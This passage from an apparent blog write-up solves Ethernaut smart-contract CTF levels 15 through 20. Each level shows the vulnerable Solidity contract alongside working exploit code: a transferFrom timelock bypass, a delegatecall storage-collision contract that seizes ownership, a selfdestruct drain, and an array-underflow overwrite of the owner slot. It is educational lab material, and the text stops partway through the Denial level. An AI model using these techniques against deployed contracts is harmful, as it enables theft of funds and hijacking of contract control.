+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'@openzeppelin/contracts/token/ERC20/ERC20.sol'</span><span class="p">;</span>
+ <span class="k">contract</span> <span class="n">NaughtCoin</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+  <span class="c1">// string public constant name = 'NaughtCoin';
+</span>  <span class="c1">// string public constant symbol = '0x0';
+</span>  <span class="c1">// uint public constant decimals = 18;
+</span>  <span class="kt">uint</span> <span class="k">public</span> <span class="n">timeLock</span> <span class="o">=</span> <span class="nb">now</span> <span class="o">+</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">365</span> <span class="kc">days</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="k">public</span> <span class="n">INITIAL_SUPPLY</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">player</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_player</span><span class="p">)</span>
+  <span class="n">ERC20</span><span class="p">(</span><span class="s">'NaughtCoin'</span><span class="p">,</span> <span class="s">'0x0'</span><span class="p">)</span>
+  <span class="k">public</span> <span class="p">{</span>
+    <span class="n">player</span> <span class="o">=</span> <span class="n">_player</span><span class="p">;</span>
+    <span class="n">INITIAL_SUPPLY</span> <span class="o">=</span> <span class="mi">1000000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="kt">uint256</span><span class="p">(</span><span class="n">decimals</span><span class="p">()));</span>
+    <span class="c1">// _totalSupply = INITIAL_SUPPLY;
+</span>    <span class="c1">// _balances[player] = INITIAL_SUPPLY;
+</span>    <span class="n">_mint</span><span class="p">(</span><span class="n">player</span><span class="p">,</span> <span class="n">INITIAL_SUPPLY</span><span class="p">);</span>
+    <span class="k">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">player</span><span class="p">,</span> <span class="n">INITIAL_SUPPLY</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">override</span> <span class="k">public</span> <span class="n">lockTokens</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">super</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="c1">// Prevent the initial owner from transferring tokens until the timelock has passed
+</span>  <span class="k">modifier</span> <span class="n">lockTokens</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">player</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nb">require</span><span class="p">(</span><span class="nb">now</span> <span class="o">&gt;</span> <span class="n">timeLock</span><span class="p">);</span>
+      <span class="n">_</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+     <span class="n">_</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve the challenge we need to send the tokens from our accont to others , and our balance should be 0.</p>
+
+<p>We can’t doirectly transfer , because of the <code class="language-plaintext highlighter-rouge">lockTokens</code> check.</p>
+
+<p>Here we are inherting the ERC20 token , in ERC20 token we have other functions like transfer to tranfer tokens.</p>
+
+<p>First we need to allow other address to send tokens behalf of our account by <code class="language-plaintext highlighter-rouge">approve</code> method.</p>
+
+<p>And then use <code class="language-plaintext highlighter-rouge">transferFrom</code> to send the tokens from the approved account.</p>
+
+<p>I approved myself as a other account here.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">);</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">f</span><span class="p">);</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span>
+	<span class="nx">player</span><span class="p">,</span>
+	<span class="dl">"</span><span class="s2">0x4FB63736C20ea6cFa8FfEFab75A728D5f4A853D8</span><span class="dl">"</span><span class="p">,</span>
+	<span class="nx">f</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="16-preservation">16 Preservation</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Preservation</span> <span class="p">{</span>
+  <span class="c1">// public library contracts
+</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone1Library</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone2Library</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="kt">uint</span> <span class="n">storedTime</span><span class="p">;</span>
+  <span class="c1">// Sets the function signature for delegatecall
+</span>  <span class="kt">bytes4</span> <span class="k">constant</span> <span class="n">setTimeSignature</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">"setTime(uint256)"</span><span class="p">));</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_timeZone1LibraryAddress</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_timeZone2LibraryAddress</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">timeZone1Library</span> <span class="o">=</span> <span class="n">_timeZone1LibraryAddress</span><span class="p">;</span>
+    <span class="n">timeZone2Library</span> <span class="o">=</span> <span class="n">_timeZone2LibraryAddress</span><span class="p">;</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="c1">// set the time for timezone 1
+</span>  <span class="k">function</span> <span class="n">setFirstTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_timeStamp</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">timeZone1Library</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="n">setTimeSignature</span><span class="p">,</span> <span class="n">_timeStamp</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="c1">// set the time for timezone 2
+</span>  <span class="k">function</span> <span class="n">setSecondTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_timeStamp</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">timeZone2Library</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="n">setTimeSignature</span><span class="p">,</span> <span class="n">_timeStamp</span><span class="p">));</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">// Simple library contract to set the time
+</span><span class="k">contract</span> <span class="n">LibraryContract</span> <span class="p">{</span>
+  <span class="c1">// stores a timestamp
+</span>  <span class="kt">uint</span> <span class="n">storedTime</span><span class="p">;</span>
+  <span class="k">function</span> <span class="n">setTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_time</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">storedTime</span> <span class="o">=</span> <span class="n">_time</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge , we need to claim the ownership of the contract.</p>
+
+<p>As we can see , there is a delegatecall in the setFirstTime function , the Sample library contract is also there.</p>
+
+<p>The first slot in the Library Contract is a storedTime when A contract delegatecalls another contract , the another contract logic will executed and the storage of the contract which called modifies,Here when we set the timeStamp it actually stores in the timeZone1Library address variable.</p>
+
+<p>So we can set the LibraryContract address by using setFirstTime function by passing our attacker contract address.</p>
+
+<p>In attacker contract the variables should be like in the same order of the Perservation contract.</p>
+
+<p>We create a function called seTime in attacker contract and update the owner varible from it . Then it changes the owner of the Perservation Contract.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">PreservationAttack</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone1Library</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone2Library</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+    <span class="k">function</span> <span class="n">setTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_time</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">owner</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">_time</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="dl">"</span><span class="s2">PreservationAttack Address</span><span class="dl">"</span><span class="p">);</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">player</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="17-recovery">17 Recovery</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Recovery</span> <span class="p">{</span>
+  <span class="c1">//generate tokens
+</span>  <span class="k">function</span> <span class="n">generateToken</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">_name</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="k">new</span> <span class="n">SimpleToken</span><span class="p">(</span><span class="n">_name</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">_initialSupply</span><span class="p">);</span>
+
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">SimpleToken</span> <span class="p">{</span>
+  <span class="kt">string</span> <span class="k">public</span> <span class="n">name</span><span class="p">;</span>
+  <span class="k">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+  <span class="c1">// constructor
+</span>  <span class="k">constructor</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">_name</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_creator</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">_name</span><span class="p">;</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">_creator</span><span class="p">]</span> <span class="o">=</span> <span class="n">_initialSupply</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">// collect ether in return for tokens
+</span>  <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">*</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">// allow transfers of tokens
+</span>  <span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">);</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_amount</span><span class="p">;</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">=</span> <span class="n">_amount</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="c1">// clean up after ourselves
+</span>  <span class="k">function</span> <span class="n">destroy</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">selfdestruct</span><span class="p">(</span><span class="n">_to</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to recover the lost contract address.</p>
+
+<p>We can calculate the address of a contract using two inputs one is sender address and another one is nonce.</p>
+
+<p>We have the sender address that is Recovery contract .</p>
+
+<p>The nonce will incremented before calculating the address as it is the first contract that Recovery contract created the nonce is 1.</p>
+
+<p>I found this python code to calculate the address using Sender and Nonce .</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">rlp</span>
+<span class="kn">from</span> <span class="nn">eth_utils</span> <span class="kn">import</span> <span class="n">keccak</span><span class="p">,</span> <span class="n">to_checksum_address</span><span class="p">,</span> <span class="n">to_bytes</span>
+<span class="k">def</span> <span class="nf">mk_contract_address</span><span class="p">(</span><span class="n">sender</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">nonce</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">sender_bytes</span> <span class="o">=</span> <span class="n">to_bytes</span><span class="p">(</span><span class="n">hexstr</span><span class="o">=</span><span class="n">sender</span><span class="p">)</span>
+    <span class="n">raw</span> <span class="o">=</span> <span class="n">rlp</span><span class="p">.</span><span class="n">encode</span><span class="p">([</span><span class="n">sender_bytes</span><span class="p">,</span> <span class="n">nonce</span><span class="p">])</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">keccak</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
+    <span class="n">address_bytes</span> <span class="o">=</span> <span class="n">h</span><span class="p">[</span><span class="mi">12</span><span class="p">:]</span>
+    <span class="k">return</span> <span class="n">to_checksum_address</span><span class="p">(</span><span class="n">address_bytes</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">mk_contract_address</span><span class="p">(</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="s">"0xc3EC367bBA66b285Be6bA770992F11eF81D555ce"</span><span class="p">),</span> <span class="mi">1</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>I got the contract address , check the balance to confirm .</p>
+
+<p>To remove the balance from the contract call the destroy function in the contract .</p>
+
+<p>Calling destroy function removes the balance from the contract.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">contract_address</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0xe67204Ff8C8236bfAf22d42Eb160c713bad456Cc</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">let</span> <span class="nx">functionSignature</span> <span class="o">=</span>
+	<span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeFunctionSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">destroy(address)</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">functionParam</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeParameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">address</span><span class="dl">"</span><span class="p">,</span> <span class="nx">player</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span>
+	<span class="na">from</span><span class="p">:</span> <span class="nx">player</span><span class="p">,</span>
+	<span class="na">to</span><span class="p">:</span> <span class="nx">contract_address</span><span class="p">,</span>
+	<span class="na">data</span><span class="p">:</span> <span class="nx">functionSignature</span> <span class="o">+</span> <span class="nx">functionParam</span><span class="p">,</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<h2 id="18-magic-number">18 Magic Number</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">MagicNum</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">solver</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="p">{}</span>
+  <span class="k">function</span> <span class="n">setSolver</span><span class="p">(</span><span class="kt">address</span> <span class="n">_solver</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">solver</span> <span class="o">=</span> <span class="n">_solver</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="cm">/*
+    ____________/\\\_______/\\\\\\\\\_____
+     __________/\\\\\_____/\\\///////\\\___
+      ________/\\\/\\\____\///______\//\\\__
+       ______/\\\/\/\\\______________/\\\/___
+        ____/\\\/__\/\\\___________/\\\//_____
+         __/\\\\\\\\\\\\\\\\_____/\\\//________
+          _\///////////\\\//____/\\\/___________
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_
+            ___________\///_____\///////////////__
+  */</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to pass a contract address that should return 42 whenever it is called regardless of the function name.</p>
+
+<p>To return a value from the stack we need to first store it .</p>
+
+<p>To store value we can use <code class="language-plaintext highlighter-rouge">MSTORE</code> opcode which takes <code class="language-plaintext highlighter-rouge">MSTORE(position,value)</code> .</p>
+
+<p>After that we return the Value using <code class="language-plaintext highlighter-rouge">RETURN</code> opcode <code class="language-plaintext highlighter-rouge">RETURN(starting_position,length)</code>.</p>
+
+<pre><code class="language-asm">PUSH1 0x2A
+PUSH1 0x60
+MSTORE
+PUSH1 0x20
+PUSH1 0x60
+RETURN
+</code></pre>
+
+<p>By replacing opcodes with Hex values . <code class="language-plaintext highlighter-rouge">602a60605260206060f3</code>.</p>
+
+<p>This is the runtime code . But to put this in blockchain we need Initialization code or creation code which returns the runtime code .</p>
+
+<p>To do that we use CODECOPY opcode which takes three arguments: target memory position to copy the code to, instruction number to copy from, and number of bytes of code to copy.</p>
+
+<p>The runtime code will start after the creation code . So the length of the creation code is the starting position for the runtime code .</p>
+
+<p>The creation code :</p>
+
+<pre><code class="language-asm">PUSH1 0x0a
+PUSH1 0x0c
+PUSH1 0x0
+CODECOPY
+PUSH1 0x0a
+PUSH1 0x0
+RETURN
+</code></pre>
+
+<p>The result hex code is <code class="language-plaintext highlighter-rouge">600a600c600039600a6000f3</code>.</p>
+
+<p>The total contract code is <code class="language-plaintext highlighter-rouge">600a600c600039600a6000f3602a60605260206060f3</code>.</p>
+
+<p>To deploy this we need to send a transcation .</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">tx</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span>
+	<span class="na">from</span><span class="p">:</span> <span class="nx">player</span><span class="p">,</span>
+	<span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0x600a600c600039600a6000f3602a60605260206060f3</span><span class="dl">"</span><span class="p">,</span>
+<span class="p">});</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setSolver</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">contractAddress</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="19-alien-codex">19 Alien Codex</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'../helpers/Ownable-05.sol'</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">AlienCodex</span> <span class="k">is</span> <span class="n">Ownable</span> <span class="p">{</span>
+  <span class="kt">bool</span> <span class="k">public</span> <span class="n">contact</span><span class="p">;</span>
+  <span class="kt">bytes32</span><span class="p">[]</span> <span class="k">public</span> <span class="n">codex</span><span class="p">;</span>
+  <span class="k">modifier</span> <span class="n">contacted</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nb">assert</span><span class="p">(</span><span class="n">contact</span><span class="p">);</span>
+    <span class="n">_</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">function</span> <span class="n">make_contact</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">contact</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">record</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_content</span><span class="p">)</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">codex</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">_content</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">retract</span><span class="p">()</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">codex</span><span class="p">.</span><span class="n">length</span><span class="o">--</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">revise</span><span class="p">(</span><span class="kt">uint</span> <span class="n">i</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_content</span><span class="p">)</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">codex</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">_content</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to claim the ownership of the contract.</p>
+
+<p>The contract inherting the ownable contract which have the owner variable. So it will come in slot 0 in our contract.</p>
+
+<p>First we need call the <code class="language-plaintext highlighter-rouge">retract</code> function o change the length of the codex . Because of the underflow of the codex size becomes <code class="language-plaintext highlighter-rouge">2 ** 256</code>.</p>
+
+<p>To call retract we need to call <code class="language-plaintext highlighter-rouge">make_contact</code> first.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">make_contact</span><span class="p">();</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">retract</span><span class="p">();</span>
+<span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="c1">//'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>
+</code></pre></div></div>
+
+<p>So that we can write at any index of the codex which is the overall storage of the contract.</p>
+
+<p>We need to calculate the slot of the codex[0] which is the place owner variable is stored . We need to find the index and pass it to <code class="language-plaintext highlighter-rouge">revise</code> function to claim the ownership.</p>
+
+<p>The length of the array is stored at slot - 1 . The array will start at <code class="language-plaintext highlighter-rouge">keccka256(slot-1) + index </code> (index = 0) .</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">index</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span>
+	<span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span>
+		<span class="p">.</span><span class="nx">toBN</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x1</span><span class="dl">"</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">64</span><span class="p">))</span>
+		<span class="p">.</span><span class="nx">sub</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">toBN</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="mi">63</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">)))</span>
+<span class="p">);</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">revise</span><span class="p">(</span><span class="nx">index</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">player</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h2 id="20-denial">20 Denial</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Denial</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">partner</span><span class="p">;</span> <span class="c1">// withdrawal partner - pay the gas, split the withdraw
+</span>    <span class="kt">address</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">owner</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
+    <span class="kt">uint</span> <span class="n">timeLastWithdrawn</span><span class="p">;</span>
+    <span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">withdrawPartnerBalances</span><span class="p">;</span> <span class="c1">// keep track of partners balances
+</span>    <span class="k">function</span> <span class="n">setWithdrawPartner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_partner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">partner</span> <span class="o">=</span> <span class="n">_partner</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">// withdraw 1% to recipient and 1% to owner
+</span>    <span class="k">function</span> <span class="n">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="kt">uint</span> <span class="n">amountToSend</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
+        <span class="c1">// perform a call without checking return
+</span>        <span class="c1">// The recipient can revert, the owner will still get their share
+</span>        <span class="n">partner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span><span class="n">amountToSend</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+        <span class="k">payable</span><span class="p">(</span><span class="n">owner</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amountToSend</span><span class="p">);</span>
+        <span class="c1">// keep track of last withdrawal time
+</span>        <span class="n">timeLastWithdrawn</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="n">timestamp</span><span class="p">;</span>
+        <span class="n">withdrawPartnerBalances</span><span class="p">[</span><span class="n">partner</span><span class="p">]</span> <span class="o">+=</span>  <span class="n">amountToSend</span><span class="p">;</span>
